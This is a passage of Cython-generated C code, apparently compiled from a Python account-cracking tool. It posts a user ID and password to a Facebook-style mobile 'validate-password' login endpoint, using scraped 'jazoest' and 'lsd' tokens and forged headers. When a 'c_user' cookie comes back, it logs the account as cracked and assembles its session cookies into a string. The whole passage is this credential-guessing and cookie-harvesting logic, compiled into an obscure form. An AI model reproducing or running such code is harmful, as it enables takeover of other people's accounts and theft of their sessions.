        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_re); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 314, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_search); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 314, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_get); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 314, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __pyx_t_3 = NULL;
        __pyx_t_19 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_18))) {
          __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_18);
          if (likely(__pyx_t_3)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_18);
            __Pyx_INCREF(__pyx_t_3);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_18, function);
            __pyx_t_19 = 1;
          }
        }
        #if CYTHON_FAST_PYCALL
        if (PyFunction_Check(__pyx_t_18)) {
          PyObject *__pyx_temp[3] = {__pyx_t_3, __pyx_kp_s_name_jazoest_value, __pyx_t_17};
          __pyx_t_16 = __Pyx_PyFunction_FastCall(__pyx_t_18, __pyx_temp+1-__pyx_t_19, 2+__pyx_t_19); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 314, __pyx_L3_error)
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        } else
        #endif
        #if CYTHON_FAST_PYCCALL
        if (__Pyx_PyFastCFunction_Check(__pyx_t_18)) {
          PyObject *__pyx_temp[3] = {__pyx_t_3, __pyx_kp_s_name_jazoest_value, __pyx_t_17};
          __pyx_t_16 = __Pyx_PyCFunction_FastCall(__pyx_t_18, __pyx_temp+1-__pyx_t_19, 2+__pyx_t_19); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 314, __pyx_L3_error)
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        } else
        #endif
        {
          __pyx_t_7 = PyTuple_New(2+__pyx_t_19); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 314, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          if (__pyx_t_3) {
            __Pyx_GIVEREF(__pyx_t_3); PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_t_3); __pyx_t_3 = NULL;
          }
          __Pyx_INCREF(__pyx_kp_s_name_jazoest_value);
          __Pyx_GIVEREF(__pyx_kp_s_name_jazoest_value);
          PyTuple_SET_ITEM(__pyx_t_7, 0+__pyx_t_19, __pyx_kp_s_name_jazoest_value);
          __Pyx_GIVEREF(__pyx_t_17);
          PyTuple_SET_ITEM(__pyx_t_7, 1+__pyx_t_19, __pyx_t_17);
          __pyx_t_17 = 0;
          __pyx_t_16 = __Pyx_PyObject_Call(__pyx_t_18, __pyx_t_7, NULL); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 314, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        }
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_t_16, __pyx_n_s_group); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 314, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __pyx_t_16 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_18))) {
          __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_18);
          if (likely(__pyx_t_16)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_18);
            __Pyx_INCREF(__pyx_t_16);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_18, function);
          }
        }
        __pyx_t_6 = (__pyx_t_16) ? __Pyx_PyObject_Call2Args(__pyx_t_18, __pyx_t_16, __pyx_int_1) : __Pyx_PyObject_CallOneArg(__pyx_t_18, __pyx_int_1);
        __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 314, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_jazoest, __pyx_t_6) < 0) __PYX_ERR(0, 314, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_uid, __pyx_v_user) < 0) __PYX_ERR(0, 314, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_flow, __pyx_n_s_login_no_pin) < 0) __PYX_ERR(0, 314, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_pass, __pyx_v_pw) < 0) __PYX_ERR(0, 314, __pyx_L3_error)
        __pyx_t_6 = PyTuple_New(3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 314, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_8 = 0;
        __pyx_t_5 = 127;
        __Pyx_INCREF(__pyx_kp_u_https);
        __pyx_t_8 += 8;
        __Pyx_GIVEREF(__pyx_kp_u_https);
        PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_kp_u_https);
        __pyx_t_18 = __Pyx_PyObject_FormatSimple(__pyx_v_url, __pyx_empty_unicode); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 314, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) : __pyx_t_5;
        __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_18);
        __Pyx_GIVEREF(__pyx_t_18);
        PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_t_18);
        __pyx_t_18 = 0;
        __Pyx_INCREF(__pyx_kp_u_login_save_device_login_source);
        __pyx_t_8 += 38;
        __Pyx_GIVEREF(__pyx_kp_u_login_save_device_login_source);
        PyTuple_SET_ITEM(__pyx_t_6, 2, __pyx_kp_u_login_save_device_login_source);
        __pyx_t_18 = __Pyx_PyUnicode_Join(__pyx_t_6, 3, __pyx_t_8, __pyx_t_5); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 314, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_next, __pyx_t_18) < 0) __PYX_ERR(0, 314, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __Pyx_XDECREF_SET(__pyx_v_data, ((PyObject*)__pyx_t_1));
        __pyx_t_1 = 0;

        
        __pyx_t_18 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_headers); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 315, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_update); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 315, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = __Pyx_PyDict_NewPresized(7); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 315, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        if (PyDict_SetItem(__pyx_t_18, __pyx_n_s_connection, __pyx_kp_s_keep_alive) < 0) __PYX_ERR(0, 315, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_18, __pyx_kp_s_cache_control, __pyx_kp_s_max_age_0) < 0) __PYX_ERR(0, 315, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_18, __pyx_kp_s_content_type, __pyx_kp_s_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 315, __pyx_L3_error)
        __pyx_t_16 = __Pyx_PyDict_GetItemDefault(__pyx_v_data, __pyx_n_s_lsd, Py_None); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 315, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        if (PyDict_SetItem(__pyx_t_18, __pyx_kp_s_x_fb_lsd, __pyx_t_16) < 0) __PYX_ERR(0, 315, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __pyx_t_16 = __Pyx_PyObject_FormatSimple(__pyx_v_url, __pyx_empty_unicode); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 315, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __pyx_t_7 = __Pyx_PyUnicode_Concat(__pyx_kp_u_https, __pyx_t_16); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 315, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        if (PyDict_SetItem(__pyx_t_18, __pyx_n_s_origin, __pyx_t_7) < 0) __PYX_ERR(0, 315, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = PyTuple_New(3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 315, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_8 = 0;
        __pyx_t_5 = 127;
        __Pyx_INCREF(__pyx_kp_u_https);
        __pyx_t_8 += 8;
        __Pyx_GIVEREF(__pyx_kp_u_https);
        PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_kp_u_https);
        __pyx_t_16 = __Pyx_PyObject_FormatSimple(__pyx_v_url, __pyx_empty_unicode); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 315, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_16) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_16) : __pyx_t_5;
        __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_16);
        __Pyx_GIVEREF(__pyx_t_16);
        PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_t_16);
        __pyx_t_16 = 0;
        __Pyx_INCREF(__pyx_kp_u_login_next_ref_dbl_fl_login_fro);
        __pyx_t_8 += 49;
        __Pyx_GIVEREF(__pyx_kp_u_login_next_ref_dbl_fl_login_fro);
        PyTuple_SET_ITEM(__pyx_t_7, 2, __pyx_kp_u_login_next_ref_dbl_fl_login_fro);
        __pyx_t_16 = __Pyx_PyUnicode_Join(__pyx_t_7, 3, __pyx_t_8, __pyx_t_5); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 315, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (PyDict_SetItem(__pyx_t_18, __pyx_n_s_referer, __pyx_t_16) < 0) __PYX_ERR(0, 315, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        { 
          __pyx_t_16 = PyList_New(0); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 315, __pyx_L23_error)
          __Pyx_GOTREF(__pyx_t_16);
          __pyx_t_8 = 0;
          __pyx_t_17 = __Pyx_dict_iterator(__pyx_v_data, 1, __pyx_n_s_items, (&__pyx_t_20), (&__pyx_t_19)); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 315, __pyx_L23_error)
          __Pyx_GOTREF(__pyx_t_17);
          __Pyx_XDECREF(__pyx_t_7);
          __pyx_t_7 = __pyx_t_17;
          __pyx_t_17 = 0;
          while (1) {
            __pyx_t_21 = __Pyx_dict_iter_next(__pyx_t_7, __pyx_t_20, &__pyx_t_8, &__pyx_t_17, &__pyx_t_3, NULL, __pyx_t_19);
            if (unlikely(__pyx_t_21 == 0)) break;
            if (unlikely(__pyx_t_21 == -1)) __PYX_ERR(0, 315, __pyx_L23_error)
            __Pyx_GOTREF(__pyx_t_17);
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_XDECREF_SET(__pyx_8genexpr1__pyx_v_x, __pyx_t_17);
            __pyx_t_17 = 0;
            __Pyx_XDECREF_SET(__pyx_8genexpr1__pyx_v_y, __pyx_t_3);
            __pyx_t_3 = 0;
            __pyx_t_3 = PyTuple_New(2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 315, __pyx_L23_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_INCREF(__pyx_8genexpr1__pyx_v_x);
            __Pyx_GIVEREF(__pyx_8genexpr1__pyx_v_x);
            PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_8genexpr1__pyx_v_x);
            __Pyx_INCREF(__pyx_8genexpr1__pyx_v_y);
            __Pyx_GIVEREF(__pyx_8genexpr1__pyx_v_y);
            PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_8genexpr1__pyx_v_y);
            __pyx_t_17 = __Pyx_PyString_Format(__pyx_kp_s_s_s, __pyx_t_3); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 315, __pyx_L23_error)
            __Pyx_GOTREF(__pyx_t_17);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(__Pyx_ListComp_Append(__pyx_t_16, (PyObject*)__pyx_t_17))) __PYX_ERR(0, 315, __pyx_L23_error)
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
          }
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __Pyx_XDECREF(__pyx_8genexpr1__pyx_v_x); __pyx_8genexpr1__pyx_v_x = 0;
          __Pyx_XDECREF(__pyx_8genexpr1__pyx_v_y); __pyx_8genexpr1__pyx_v_y = 0;
          goto __pyx_L26_exit_scope;
          __pyx_L23_error:;
          __Pyx_XDECREF(__pyx_8genexpr1__pyx_v_x); __pyx_8genexpr1__pyx_v_x = 0;
          __Pyx_XDECREF(__pyx_8genexpr1__pyx_v_y); __pyx_8genexpr1__pyx_v_y = 0;
          goto __pyx_L3_error;
          __pyx_L26_exit_scope:;
        } 
        __pyx_t_7 = __Pyx_PyString_Join(__pyx_kp_s__75, __pyx_t_16); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 315, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __pyx_t_20 = PyObject_Length(__pyx_t_7); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 315, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = PyInt_FromSsize_t(__pyx_t_20); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 315, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_16 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_7); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 315, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (PyDict_SetItem(__pyx_t_18, __pyx_kp_s_content_length, __pyx_t_16) < 0) __PYX_ERR(0, 315, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __pyx_t_16 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_16)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_16);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
          }
        }
        __pyx_t_1 = (__pyx_t_16) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_16, __pyx_t_18) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_18);
        __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 315, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

        
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_post); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 316, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_6 = PyTuple_New(3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 316, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_20 = 0;
        __pyx_t_5 = 127;
        __Pyx_INCREF(__pyx_kp_u_https);
        __pyx_t_20 += 8;
        __Pyx_GIVEREF(__pyx_kp_u_https);
        PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_kp_u_https);
        __pyx_t_18 = __Pyx_PyObject_FormatSimple(__pyx_v_url, __pyx_empty_unicode); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 316, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_18) : __pyx_t_5;
        __pyx_t_20 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_18);
        __Pyx_GIVEREF(__pyx_t_18);
        PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_t_18);
        __pyx_t_18 = 0;
        __Pyx_INCREF(__pyx_kp_u_login_device_based_validate_pas);
        __pyx_t_20 += 45;
        __Pyx_GIVEREF(__pyx_kp_u_login_device_based_validate_pas);
        PyTuple_SET_ITEM(__pyx_t_6, 2, __pyx_kp_u_login_device_based_validate_pas);
        __pyx_t_18 = __Pyx_PyUnicode_Join(__pyx_t_6, 3, __pyx_t_20, __pyx_t_5); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 316, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = PyTuple_New(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 316, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_GIVEREF(__pyx_t_18);
        PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_t_18);
        __pyx_t_18 = 0;
        __pyx_t_18 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 316, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        if (PyDict_SetItem(__pyx_t_18, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 316, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_18, __pyx_n_s_allow_redirects, Py_True) < 0) __PYX_ERR(0, 316, __pyx_L3_error)
        __pyx_t_16 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_6, __pyx_t_18); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 316, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __Pyx_XDECREF_SET(__pyx_v_post, __pyx_t_16);
        __pyx_t_16 = 0;

        
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_cookies); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 317, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 317, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_1);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_1, function);
          }
        }
        __pyx_t_18 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 317, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_18);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_18, __pyx_n_s_items); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 317, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
        __pyx_t_18 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
          __pyx_t_18 = PyMethod_GET_SELF(__pyx_t_1);
          if (likely(__pyx_t_18)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
            __Pyx_INCREF(__pyx_t_18);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_1, function);
          }
        }
        __pyx_t_16 = (__pyx_t_18) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_18) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
        __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
        if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 317, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_22 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_c_user, __pyx_t_16, Py_EQ)); if (unlikely(__pyx_t_22 < 0)) __PYX_ERR(0, 317, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __pyx_t_23 = (__pyx_t_22 != 0);
        if (__pyx_t_23) {

          
          __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_ok); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 318, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_16);
          __pyx_t_24 = __Pyx_PyObject_Append(__pyx_t_16, __pyx_v_user); if (unlikely(__pyx_t_24 == ((int)-1))) __PYX_ERR(0, 318, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;

          
          { 
            __pyx_t_16 = PyList_New(0); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 319, __pyx_L30_error)
            __Pyx_GOTREF(__pyx_t_16);
            __pyx_t_20 = 0;
            __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_cookies); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 319, __pyx_L30_error)
            __Pyx_GOTREF(__pyx_t_6);
            __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 319, __pyx_L30_error)
            __Pyx_GOTREF(__pyx_t_7);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __pyx_t_6 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
              __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_7);
              if (likely(__pyx_t_6)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
                __Pyx_INCREF(__pyx_t_6);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_7, function);
              }
            }
            __pyx_t_18 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 319, __pyx_L30_error)
            __Pyx_GOTREF(__pyx_t_18);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            if (unlikely(__pyx_t_18 == Py_None)) {
              PyErr_Format(PyExc_AttributeError, "'NoneType' object has no attribute '%.30s'", "items");
              __PYX_ERR(0, 319, __pyx_L30_error)
            }
            __pyx_t_7 = __Pyx_dict_iterator(__pyx_t_18, 0, __pyx_n_s_items, (&__pyx_t_8), (&__pyx_t_19)); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 319, __pyx_L30_error)
            __Pyx_GOTREF(__pyx_t_7);
            __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            __Pyx_XDECREF(__pyx_t_1);
            __pyx_t_1 = __pyx_t_7;
            __pyx_t_7 = 0;
            while (1) {
              __pyx_t_21 = __Pyx_dict_iter_next(__pyx_t_1, __pyx_t_8, &__pyx_t_20, &__pyx_t_7, &__pyx_t_18, NULL, __pyx_t_19);
              if (unlikely(__pyx_t_21 == 0)) break;
              if (unlikely(__pyx_t_21 == -1)) __PYX_ERR(0, 319, __pyx_L30_error)
              __Pyx_GOTREF(__pyx_t_7);
              __Pyx_GOTREF(__pyx_t_18);
              __Pyx_XDECREF_SET(__pyx_8genexpr2__pyx_v_key, __pyx_t_7);
              __pyx_t_7 = 0;
              __Pyx_XDECREF_SET(__pyx_8genexpr2__pyx_v_value, __pyx_t_18);
              __pyx_t_18 = 0;
              __pyx_t_18 = PyNumber_Add(__pyx_8genexpr2__pyx_v_key, __pyx_kp_s__61); if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 319, __pyx_L30_error)
              __Pyx_GOTREF(__pyx_t_18);
              __pyx_t_7 = PyNumber_Add(__pyx_t_18, __pyx_8genexpr2__pyx_v_value); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 319, __pyx_L30_error)
              __Pyx_GOTREF(__pyx_t_7);
              __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
              if (unlikely(__Pyx_ListComp_Append(__pyx_t_16, (PyObject*)__pyx_t_7))) __PYX_ERR(0, 319, __pyx_L30_error)
              __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            }
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_XDECREF(__pyx_8genexpr2__pyx_v_key); __pyx_8genexpr2__pyx_v_key = 0;
            __Pyx_XDECREF(__pyx_8genexpr2__pyx_v_value); __pyx_8genexpr2__pyx_v_value = 0;
            goto __pyx_L33_exit_scope;
            __pyx_L30_error:;
            __Pyx_XDECREF(__pyx_8genexpr2__pyx_v_key); __pyx_8genexpr2__pyx_v_key = 0;
            __Pyx_XDECREF(__pyx_8genexpr2__pyx_v_value); __pyx_8genexpr2__pyx_v_value = 0;
            goto __pyx_L3_error;
            __pyx_L33_exit_scope:;
          } 
          __pyx_t_1 = __Pyx_PyString_Join(__pyx_kp_s__68, __pyx_t_16); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 319, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          __pyx_v_cookie = ((PyObject*)__pyx_t_1);
          __pyx_t_1 = 0;

          
          __pyx_t_1 = PyTuple_New(9); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 320, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_8 = 0;
          __pyx_t_5 = 127;
          __Pyx_INCREF(__pyx_kp_u__69);
          __pyx_t_8 += 3;
          __Pyx_GIVEREF(__pyx_kp_u__69);
          PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_kp_u__69);
          __Pyx_GetModuleGlobalName(__pyx_t_16, __pyx_n_s_H); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 320, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_16);
          __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_t_16, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 320, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
